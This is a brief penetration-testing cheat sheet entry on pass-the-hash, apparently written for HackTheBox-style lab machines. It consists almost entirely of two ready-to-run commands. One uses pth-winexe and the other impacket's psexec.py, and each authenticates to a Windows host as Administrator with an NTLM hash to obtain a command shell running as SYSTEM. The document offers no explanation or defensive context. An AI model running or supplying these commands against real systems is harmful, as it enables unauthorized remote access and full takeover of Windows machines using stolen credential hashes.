# Pass The Hash

## get a shell with a Hash on windows system
```cheat passthehash Get a shell using hash
pth-winexe -U Administrator%aad3b435b51404eeaad3b435b51404ee:9e730375b7cbcebf74ae46481e07b0c7 //10.10.10.x cmd
```

```cheat passthehash --> nt authority\system
python psexec.py Administrator@10.10.10.63 -hashes "aad3b435b51404eeaad3b435b51404ee:e0fb1fb85756c24235ff238cbe81fe00"

tags: passthehash pass the hash pth-winexe ippsec silo
